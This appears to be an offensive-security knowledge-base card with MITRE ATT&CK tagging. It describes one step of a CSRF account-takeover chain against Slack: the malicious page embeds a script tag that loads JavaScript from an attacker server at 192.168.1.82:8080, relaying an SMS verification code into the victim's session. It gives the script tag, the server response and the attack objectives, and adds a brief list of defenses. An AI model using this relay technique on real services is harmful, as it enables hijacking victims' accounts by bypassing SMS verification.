---
id: proc-slack-js-callback
tags:
  - javascript
  - callback
  - c2
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:29.561Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Setup-JavaScript-Callback-for-SMS-Code

## Summary

This procedure sets up a JavaScript callback in the malicious page to fetch the SMS verification code from the attacker's server, enabling automated relay back to the victim's browser.

## Description

After the CSRF form adds the phone and triggers SMS, the page includes a script tag loading external JS from the attacker's server (e.g., http://192.168.1.82:8080/a). This JS sets a global variable 'scode' with the code, which is used in the next form. This bridges the out-of-band SMS to in-browser automation.

## Requirements

1. Attacker's server running on accessible IP/port (e.g., 192.168.1.82:8080)
2. Victim's browser able to fetch from attacker's domain
3. SMS code ready on attacker side

## Defense

Defensive measures and detection strategies:

- Implement strict CSP to block external script loads
- Proxy all external fetches through approved domains
- Monitor for cross-origin requests to suspicious IPs
- Log JS variable sets in browser for anomalies

## Objectives

1. Relay SMS code from attacker to victim's page
2. Automate verification without manual input
3. Maintain attack flow in victim's session

## Instructions

### Step 1: Embed Script Tag

**Context**: Add to slackcsrf.html to load callback JS on page load.

HTML: <script src="http://192.168.1.82:8080/a"></script>

> JS from /a will execute and set scode.

### Step 2: Prepare Server Response

**Context**: Ensure server at /a returns the code format.

Response body: scode=196206;

> Global scode now available for next form.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[JavaScript]]
- [[callback]]
